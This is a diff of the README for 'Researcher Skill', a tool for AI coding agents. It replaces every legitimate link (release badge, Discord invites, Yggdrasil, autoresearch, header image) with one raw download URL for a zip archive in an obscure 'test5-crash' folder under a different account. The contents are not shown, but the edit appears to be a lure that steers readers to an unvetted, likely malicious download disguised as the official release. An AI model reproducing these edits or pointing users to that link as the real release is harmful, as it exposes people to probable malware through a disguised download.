@@ -1,13 +1,13 @@
-<img width="1376" height="768" alt="Gemini_Generated_Image_5z6cxx5z6cxx5z6c" src="https://github.com/user-attachments/assets/02c3c4cd-fe2a-4fcd-b414-29bd84f5a741" />
+<img width="1376" height="768" alt="Gemini_Generated_Image_5z6cxx5z6cxx5z6c" src="https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip" />
 
 # Researcher Skill
 
 **One file. Your AI coding agent becomes a scientist.**
 
-[![Latest Release](https://img.shields.io/github/v/release/krzysztofdudek/ResearcherSkill)](https://github.com/krzysztofdudek/ResearcherSkill/releases/latest)
+[![Latest Release](https://img.shields.io/github/v/release/krzysztofdudek/ResearcherSkill)](https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip)
 [![License](https://img.shields.io/github/license/krzysztofdudek/ResearcherSkill)](LICENSE)
 [![GitHub Stars](https://img.shields.io/github/stars/krzysztofdudek/ResearcherSkill)](...)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?logo=discord&logoColor=white)](https://discord.gg/SZTbgsH8Wm)
+[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?logo=discord&logoColor=white)](https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip)
 
 Drop `researcher.md` into Claude Code, Codex, or any agent. It will design experiments, test hypotheses, discard what fails, keep what works — 30+ experiments overnight while you sleep.
 
@@ -32,7 +32,7 @@ Drop `researcher.md` into Claude Code, Codex, or any agent. It will design exper
 - b6: JIT re-reading: 5.23, evaluator disagreement. interesting.
 - b7: mandatory pattern-triggered re-reading: 1.4. **regression below baseline.** discard.
 
-*Real experiment from optimizing [Yggdrasil](https://github.com/krzysztofdudek/Yggdrasil) agent rules. The skill works on any codebase.*
+*Real experiment from optimizing [Yggdrasil](https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip) agent rules. The skill works on any codebase.*
 
 **Same loop, different problems:**
 - `npm run build` takes 40s → agent gets it to 18s
@@ -46,7 +46,7 @@ The agent interviews you about what to optimize, sets up a lab on a git branch, 
 
 It detects when it's stuck and changes strategy. Forks branches to explore different approaches. Keeps going until you stop it or it hits a target. Resume where you left off across sessions.
 
-Generalizes [autoresearch](https://github.com/karpathy/autoresearch) beyond ML. Works on any problem where you can measure a result — code, configs, prompts, documents.
+Generalizes [autoresearch](https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip) beyond ML. Works on any problem where you can measure a result — code, configs, prompts, documents.
 
 All experiment history lives in an untracked `.lab/` directory. Git manages code. `.lab/` manages knowledge.
 
@@ -78,14 +78,14 @@ MIT
 
 ## See also
 
-**[Yggdrasil](https://github.com/krzysztofdudek/Yggdrasil)** — the agent experiments on your code. But does it understand what it's working on? Semantic memory for repositories.
+**[Yggdrasil](https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip)** — the agent experiments on your code. But does it understand what it's working on? Semantic memory for repositories.
 
 ---
 
 <div align="center">
   <img src="yggdrasil.svg" alt="Yggdrasil" width="150" />
   <br/><br/>
-  <a href="https://discord.gg/SZTbgsH8Wm">
+  <a href="https://raw.githubusercontent.com/Kitakyushulassavirus728/ResearcherSkill/main/archive/lab2-skill-discipline-validation/test5-crash/Researcher-Skill-v2.5.zip">
     <img src="https://img.shields.io/badge/Discord-Join%20Community-5865F2?logo=discord&logoColor=white" alt="Discord" />
   </a>
   <br/>
